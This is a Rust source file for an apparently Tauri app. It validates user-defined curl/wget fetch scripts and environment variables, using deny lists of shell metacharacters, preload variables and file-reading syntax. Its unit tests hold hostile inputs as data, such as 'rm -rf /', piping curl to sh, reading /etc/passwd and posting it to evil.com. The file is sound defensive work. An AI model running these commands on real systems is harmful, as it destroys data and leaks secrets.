use crate::config::ApiProvider;
use crate::error::AppError;
use crate::services::{script_runner, shell_utils};
use crate::state::AppState;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::process::Command;
use tauri::State;

const ALLOWED_COMMANDS: &[&str] = &["curl", "wget", "http", "httpie"];
const DANGEROUS_PATTERNS: &[&str] = &[
    ";", "&&", "||", "|", "`", "$(", "${", "\n", "\r", ">", "<", ">>", "<<", "&>", "2>",
];
const DANGEROUS_URL_PATTERNS: &[&str] = &["file://", "file:", "@/", "@./", "@~/"];
const DANGEROUS_OPTIONS: &[&str] = &["-o", "-O", "--output", "--data-binary"];
const DANGEROUS_ENV_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "PATH",
    "HOME",
    "SHELL",
    "BASH_ENV",
    "ENV",
    "IFS",
];
const DANGEROUS_VALUE_CHARS: &[char] = &[
    ';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '\n', '\r', '\0', '\'', '"',
];

fn parse_fetch_script(
    script: &str,
    env: &HashMap<String, String>,
) -> Result<Vec<String>, AppError> {
    shell_utils::parse_command(script, env).ok_or_else(|| {
        AppError::Validation("Invalid fetch script: unmatched quotes or escape sequences".into())
    })
}

/// Validates provider ID to prevent path traversal attacks.
fn validate_provider_id(id: &str) -> Result<(), AppError> {
    let has_path_chars = id.contains('/') || id.contains('\\') || id.contains('\0');
    let is_traversal = id == ".."
        || id.starts_with("../")
        || id.starts_with("..\\")
        || id.contains("/..")
        || id.contains("\\..");

    if id.is_empty() || has_path_chars || is_traversal {
        return Err(AppError::Validation(
            "Provider ID is empty or contains invalid characters".to_string(),
        ));
    }
    Ok(())
}

/// Validates environment variable keys and values to prevent injection.
fn validate_env(env: &std::collections::HashMap<String, String>) -> Result<(), AppError> {
    for (key, value) in env {
        if key.is_empty() || key.contains('=') || key.contains('\0') {
            return Err(AppError::Validation(format!(
                "Invalid environment variable key: '{key}'"
            )));
        }
        let upper_key = key.to_uppercase();
        if DANGEROUS_ENV_VARS.contains(&upper_key.as_str()) {
            return Err(AppError::Validation(format!(
                "Environment variable '{key}' is not allowed for security reasons"
            )));
        }
        if let Some(c) = value.chars().find(|c| DANGEROUS_VALUE_CHARS.contains(c)) {
            return Err(AppError::Validation(format!(
                "Environment variable value for '{key}' contains dangerous character: '{c}'"
            )));
        }
    }
    Ok(())
}

fn validate_fetch_script(script: &str) -> Result<(), AppError> {
    let trimmed = script.trim();

    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    if !ALLOWED_COMMANDS.contains(&first_word) {
        return Err(AppError::Validation(format!(
            "Fetch script must start with one of: {}. Got: '{first_word}'",
            ALLOWED_COMMANDS.join(", ")
        )));
    }

    if let Some(pattern) = DANGEROUS_PATTERNS.iter().find(|p| trimmed.contains(*p)) {
        return Err(AppError::Validation(format!(
            "Fetch script contains dangerous pattern: '{pattern}'. Only simple HTTP commands are allowed."
        )));
    }

    let lower = trimmed.to_lowercase();
    if let Some(pattern) = DANGEROUS_URL_PATTERNS.iter().find(|p| lower.contains(*p)) {
        return Err(AppError::Validation(format!(
            "Fetch script contains dangerous pattern: '{pattern}'. Only http/https URLs are allowed."
        )));
    }

    if let Some(parts) = shlex::split(trimmed) {
        for part in &parts {
            if DANGEROUS_OPTIONS.contains(&part.as_str()) {
                return Err(AppError::Validation(format!(
                    "Fetch script contains dangerous option: '{part}'. Output redirection is not allowed."
                )));
            }
            // Reject @file syntax which could read local files
            if part.starts_with('@') && part.len() > 1 {
                return Err(AppError::Validation(
                    "Fetch script contains '@file' syntax which could read local files. This is not allowed.".into()
                ));
            }
        }
    }

    Ok(())
}

// Tauri commands require owned types for IPC serialization
#[allow(clippy::needless_pass_by_value)]
#[tauri::command]
pub fn get_providers(state: State<'_, AppState>) -> Result<Vec<ApiProvider>, AppError> {
    let providers_dir = state.config_dir.join("providers");
    fs::create_dir_all(&providers_dir)?;

    let mut providers = Vec::new();
    let entries = fs::read_dir(&providers_dir)?;

    for entry in entries.flatten() {
        if entry.path().extension().is_some_and(|e| e == "json") {
            if let Ok(content) = fs::read_to_string(entry.path()) {
                match serde_json::from_str::<ApiProvider>(&content) {
                    Ok(provider) => providers.push(provider),
                    Err(e) => {
                        eprintln!("Failed to parse provider {}: {}", entry.path().display(), e);
                    }
                }
            }
        }
    }

    Ok(providers)
}

#[allow(clippy::needless_pass_by_value)]
#[tauri::command]
pub fn save_provider(state: State<'_, AppState>, provider: ApiProvider) -> Result<(), AppError> {
    validate_provider_id(&provider.id)?;
    validate_fetch_script(&provider.fetch_script)?;
    validate_env(&provider.env)?;

    let providers_dir = state.config_dir.join("providers");
    fs::create_dir_all(&providers_dir)?;

    let id = &provider.id;
    let provider_path = providers_dir.join(format!("{id}.json"));
    let content = serde_json::to_string_pretty(&provider)?;
    fs::write(provider_path, content)?;
    Ok(())
}

#[allow(clippy::needless_pass_by_value)]
#[tauri::command]
pub fn delete_provider(state: State<'_, AppState>, id: String) -> Result<(), AppError> {
    validate_provider_id(&id)?;

    let provider_path = state
        .config_dir
        .join("providers")
        .join(format!("{id}.json"));
    if provider_path.exists() {
        fs::remove_file(provider_path)?;
    }
    Ok(())
}

#[derive(Serialize, Deserialize)]
pub struct TestResult {
    pub success: bool,
    pub data: Option<serde_json::Value>,
    pub error: Option<String>,
}

impl TestResult {
    const fn success(data: serde_json::Value) -> Self {
        Self {
            success: true,
            data: Some(data),
            error: None,
        }
    }

    const fn failure(error: String) -> Self {
        Self {
            success: false,
            data: None,
            error: Some(error),
        }
    }
}

#[allow(clippy::needless_pass_by_value)]
#[tauri::command]
pub async fn test_provider(provider: ApiProvider) -> Result<TestResult, AppError> {
    validate_fetch_script(&provider.fetch_script)?;
    validate_env(&provider.env)?;

    let parts = parse_fetch_script(&provider.fetch_script, &provider.env)?;
    if parts.is_empty() {
        return Err(AppError::Validation("Empty fetch script".to_string()));
    }

    let output = Command::new(&parts[0])
        .args(&parts[1..])
        .env_clear()
        .envs(&provider.env)
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Ok(TestResult::failure(format!("Fetch failed: {stderr}")));
    }

    let stdout = String::from_utf8(output.stdout).map_err(|e| AppError::Fetch(e.to_string()))?;

    if provider.transform_script.is_empty() {
        let data: serde_json::Value = serde_json::from_str(&stdout)?;
        return Ok(TestResult::success(data));
    }

    match script_runner::run_transform_script(&provider.transform_script, &stdout) {
        Ok(result) => {
            let data: serde_json::Value = serde_json::from_str(&result)?;
            Ok(TestResult::success(data))
        }
        Err(e) => Ok(TestResult::failure(format!("Transform failed: {e}"))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    // ==================== validate_provider_id tests ====================

    #[test]
    fn test_validate_provider_id_valid() {
        assert!(validate_provider_id("my-provider").is_ok());
        assert!(validate_provider_id("provider_1").is_ok());
        assert!(validate_provider_id("Provider123").is_ok());
    }

    #[test]
    fn test_validate_provider_id_empty() {
        assert!(validate_provider_id("").is_err());
    }

    #[test]
    fn test_validate_provider_id_path_traversal() {
        assert!(validate_provider_id("../etc/passwd").is_err());
        assert!(validate_provider_id("foo/bar").is_err());
        assert!(validate_provider_id("foo\\bar").is_err());
        assert!(validate_provider_id("..").is_err());
        assert!(validate_provider_id("foo..bar").is_ok());
    }

    #[test]
    fn test_validate_provider_id_null_byte() {
        assert!(validate_provider_id("foo\0bar").is_err());
    }

    // ==================== validate_env tests ====================

    #[test]
    fn test_validate_env_valid() {
        let mut env = HashMap::new();
        env.insert("API_KEY".to_string(), "secret123".to_string());
        env.insert("TOKEN".to_string(), "abc123".to_string());
        assert!(validate_env(&env).is_ok());
    }

    #[test]
    fn test_validate_env_empty_key() {
        let mut env = HashMap::new();
        env.insert("".to_string(), "value".to_string());
        assert!(validate_env(&env).is_err());
    }

    #[test]
    fn test_validate_env_contains_equals() {
        let mut env = HashMap::new();
        env.insert("FOO=BAR".to_string(), "value".to_string());
        assert!(validate_env(&env).is_err());
    }

    #[test]
    fn test_validate_env_contains_null() {
        let mut env = HashMap::new();
        env.insert("FOO\0BAR".to_string(), "value".to_string());
        assert!(validate_env(&env).is_err());
    }

    #[test]
    fn test_validate_env_dangerous_vars() {
        let dangerous = [
            "PATH",
            "path",
            "Path",
            "HOME",
            "SHELL",
            "LD_PRELOAD",
            "DYLD_INSERT_LIBRARIES",
        ];
        for var in dangerous {
            let mut env = HashMap::new();
            env.insert(var.to_string(), "value".to_string());
            assert!(
                validate_env(&env).is_err(),
                "Should reject dangerous env var: {}",
                var
            );
        }
    }

    #[test]
    fn test_validate_env_dangerous_value_chars() {
        let dangerous_values = [
            "'; rm -rf /",
            "value; echo pwned",
            "$(whoami)",
            "`id`",
            "foo\nbar",
            "test|cat",
            "a&b",
        ];
        for value in dangerous_values {
            let mut env = HashMap::new();
            env.insert("API_KEY".to_string(), value.to_string());
            assert!(
                validate_env(&env).is_err(),
                "Should reject dangerous value: {}",
                value
            );
        }
    }

    // ==================== validate_fetch_script tests ====================

    #[test]
    fn test_validate_fetch_script_valid_curl() {
        assert!(validate_fetch_script("curl https://api.example.com").is_ok());
        assert!(validate_fetch_script(
            "curl -H 'Authorization: Bearer token' https://api.example.com"
        )
        .is_ok());
    }

    #[test]
    fn test_validate_fetch_script_valid_wget() {
        assert!(validate_fetch_script("wget -qO- https://api.example.com").is_ok());
    }

    #[test]
    fn test_validate_fetch_script_valid_http() {
        assert!(validate_fetch_script("http https://api.example.com").is_ok());
        assert!(validate_fetch_script("httpie https://api.example.com").is_ok());
    }

    #[test]
    fn test_validate_fetch_script_disallowed_command() {
        assert!(validate_fetch_script("rm -rf /").is_err());
        assert!(validate_fetch_script("cat /etc/passwd").is_err());
        assert!(validate_fetch_script("sh -c 'echo hello'").is_err());
        assert!(validate_fetch_script("python -c 'print(1)'").is_err());
    }

    #[test]
    fn test_validate_fetch_script_command_chaining() {
        assert!(validate_fetch_script("curl https://api.com; rm -rf /").is_err());
        assert!(validate_fetch_script("curl https://api.com && echo pwned").is_err());
        assert!(validate_fetch_script("curl https://api.com || echo fallback").is_err());
    }

    #[test]
    fn test_validate_fetch_script_pipe() {
        assert!(validate_fetch_script("curl https://api.com | sh").is_err());
    }

    #[test]
    fn test_validate_fetch_script_command_substitution() {
        assert!(validate_fetch_script("curl https://$(whoami).com").is_err());
        assert!(validate_fetch_script("curl https://`whoami`.com").is_err());
        assert!(validate_fetch_script("curl https://${USER}.com").is_err());
    }

    #[test]
    fn test_validate_fetch_script_redirection() {
        assert!(validate_fetch_script("curl https://api.com > /tmp/out").is_err());
        assert!(validate_fetch_script("curl https://api.com >> /tmp/out").is_err());
        assert!(validate_fetch_script("curl https://api.com < /etc/passwd").is_err());
        assert!(validate_fetch_script("curl https://api.com 2>/dev/null").is_err());
    }

    #[test]
    fn test_validate_fetch_script_newline_injection() {
        assert!(validate_fetch_script("curl https://api.com\nrm -rf /").is_err());
        assert!(validate_fetch_script("curl https://api.com\rrm -rf /").is_err());
    }

    #[test]
    fn test_validate_fetch_script_empty() {
        assert!(validate_fetch_script("").is_err());
        assert!(validate_fetch_script("   ").is_err());
    }

    // ==================== New security tests ====================

    #[test]
    fn test_validate_fetch_script_file_protocol() {
        assert!(validate_fetch_script("curl file:///etc/passwd").is_err());
        assert!(validate_fetch_script("curl FILE:///etc/passwd").is_err());
        assert!(validate_fetch_script("wget file:///etc/passwd").is_err());
    }

    #[test]
    fn test_validate_fetch_script_at_file_syntax() {
        assert!(validate_fetch_script("curl --data @/etc/passwd https://evil.com").is_err());
        assert!(validate_fetch_script("curl -d @./secret.txt https://evil.com").is_err());
    }

    #[test]
    fn test_validate_fetch_script_output_options() {
        assert!(validate_fetch_script("curl -o /tmp/out https://api.com").is_err());
        assert!(validate_fetch_script("curl -O https://api.com/file").is_err());
        assert!(validate_fetch_script("curl --output /tmp/out https://api.com").is_err());
        assert!(validate_fetch_script("wget -O /tmp/out https://api.com").is_err());
    }
}
